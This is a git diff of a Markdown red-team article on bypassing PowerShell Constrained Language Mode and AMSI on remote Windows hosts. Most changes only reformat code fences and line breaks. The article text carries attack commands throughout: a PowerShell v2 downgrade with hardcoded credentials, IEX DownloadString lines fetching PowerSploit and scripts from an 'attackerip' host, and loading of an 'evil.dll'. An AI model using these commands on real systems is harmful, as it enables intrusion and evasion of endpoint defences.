@@ -195,8 +195,17 @@ Unfortunately, if the remote target enforces CLM using `$Env:__PSLockDownPolicy`
 
 The easiest and most common way to bypass CLM is PowerShell downgrade. As CLM was introduced with PowerShell v5, switching to previous versions (v2) is an effective way of bypassing it. To prove that, it is enough to run the following code:
 
-```PowerShell
-$pass=(ConvertTo-SecureString "Passw0rd!" -AsPlainText -Force); $cred=(New-Object System.Management.Automation.PSCredential("pcoiptest\Administrator", $pass)); Invoke-Command -ComputerName pcoip -Credential $cred -ScriptBlock { Write-Output $PSVersionTable; Write-Output ""; Write-Host "LanguageMode: " $ExecutionContext.SessionState.LanguageMode; Write-Output ""; powershell -version 2 "Write-Output `$PSVersionTable";powershell -version 2 "Write-Host 'LanguageMode:'`$ExecutionContext.SessionState.LanguageMode" }
+```powershell
+$pass=(ConvertTo-SecureString "Passw0rd!" -AsPlainText -Force); 
+$cred=(New-Object System.Management.Automation.PSCredential("pc-2\Administrator", $pass)); 
+Invoke-Command -ComputerName pcoip -Credential $cred -ScriptBlock { 
+    Write-Output $PSVersionTable;
+    Write-Output ""; 
+    Write-Host "LanguageMode: " $ExecutionContext.SessionState.LanguageMode; 
+    Write-Output ""; 
+    powershell -version 2 "Write-Output `$PSVersionTable";
+    powershell -version 2 "Write-Host 'LanguageMode:'`$ExecutionContext.SessionState.LanguageMode" 
+}
 ```
 
 Below a screenshot proving the above:
@@ -210,7 +219,8 @@ As an alternative way to bypass CLM, it might be legit to think that overwriting
 Surprisingly or not, although this method seems to be valid if performed locally by an Administrator, if run against a remote target, this approach failed quite miserably in multiple tests performed, showing that it's not really feasible to overwrite `__PSLockDownPolicy` from within a Remote CLM PowerShell Interface. An example of that is showed below:
 
 > Command Executed:
-> ```PowerShell
+>
+> ```powershell
 > set __PSLockDownPolicy=8
 > setx __PSLockDownPolicy 8
 > $Env:__PSLockDownPolicy=8
@@ -243,6 +253,7 @@ _The target of this operation will be the registry key `HKLM\System\CurrentContr
       height="600"
       src="https://drive.google.com/file/d/1yzUNYw9-X8AqarSADNir1mk-usvHS28t/preview"
       frameborder="0"
+      allow="autoplay"
       allowfullscreen="">
   </iframe>
 </div>
@@ -273,7 +284,7 @@ At this point, AMSI might appear like a very good defence line... Well, not real
 
 Indeed, in a few tests, AMSI could not detect the use of PowerUp at all:
 
-> ```PowerShell
+> ```powershell
 > IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
 > Invoke-AllChecks
 > ```
@@ -281,7 +292,7 @@ Indeed, in a few tests, AMSI could not detect the use of PowerUp at all:
 <img style="display: block;margin-left: auto;margin-right: auto;" src="assets/4.gif">
 
 But it had more luck with PowerView:
-> ```PowerShell
+> ```powershell
 > IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
 > IEX (New-Object Net.WebClient).DownloadString('http://192.168.152.100/PowerView.ps1')
 > Import-Module C:\payloads\PowerView.ps1')
@@ -312,7 +323,7 @@ With that in mind, implementing an AMSI Bypass is not so difficult, and there ar
 
 Point 2., instead, gives the attacker the possibility to load and execute any AMSI Bypass written in PowerShell. As an example, consider the following snippet:
 
-```CSharp
+```csharp
 PowerShell ps = PowerShell.Create();
 string code = "IEX (New-Object Net.WebClient).DownloadString('http://attackerip/AmsiBypass.ps1');";
 ps.AddScript(code).Invoke();
@@ -334,7 +345,7 @@ portfwd add -R -p 8080 -L X.X.X.X -l 8080
 
 * If required, on **PC-2**, even with PowerShell Constrained Language Mode, it should be possible to issue a netsh command, like:
 
-```PowerShell
+```powershell
 $pass=(ConvertTo-SecureString "Passw0rd!" -AsPlainText -Force); 
 $cred=(New-Object System.Management.Automation.PSCredential("test.local\Administrator", $pass)); 
 Invoke-Command -ComputerName pc-2.test.local -Credential $cred -ScriptBlock {
@@ -345,7 +356,7 @@ Invoke-Command -ComputerName pc-2.test.local -Credential $cred -ScriptBlock {
 
 After that, it should be possible to bypass AMSI and execute any payload using the following commands:
 
-```PowerShell
+```powershell
 $pass=(ConvertTo-SecureString "Passw0rd!" -AsPlainText -Force); 
 $cred=(New-Object System.Management.Automation.PSCredential("test.local\Administrator", $pass)); 
 Invoke-Command -ComputerName pc-2.test.local -Credential $cred -ScriptBlock {
@@ -367,7 +378,7 @@ The general technique used to import arbitrary modules and PowerShell scripts, u
 
 As an example, please consider the following snippet:
 
-```CSharp
+```csharp
 PowerShell ps = PowerShell.Create();
 # Downloading module/script
 string script = (new WebClient()).DownloadString('http://attackerip/evil.ps1');
@@ -387,7 +398,7 @@ Regarding in-memory execution, from v4.8, the .NET framework uses both AMSI and 
 
 Why this is interesting in this context? Well, as for PowerShell is concerned, C# assemblies can be loaded dynamically, using one of the following methods:
 
-```
+```powershell
 # Method 1
 Add-Type -Path 'C:\Windows\Temp\evil.dll'
 
@@ -489,6 +500,7 @@ The funny thing about the framework is that the user is not required to port any
       height="600"
       src="https://drive.google.com/file/d/1xJM-FcA9cuis-g1WTdRpeCIy4VR4LmeI/preview"
       frameborder="0"
+      allow="autoplay"
       allowfullscreen="">
   </iframe>
 </div>
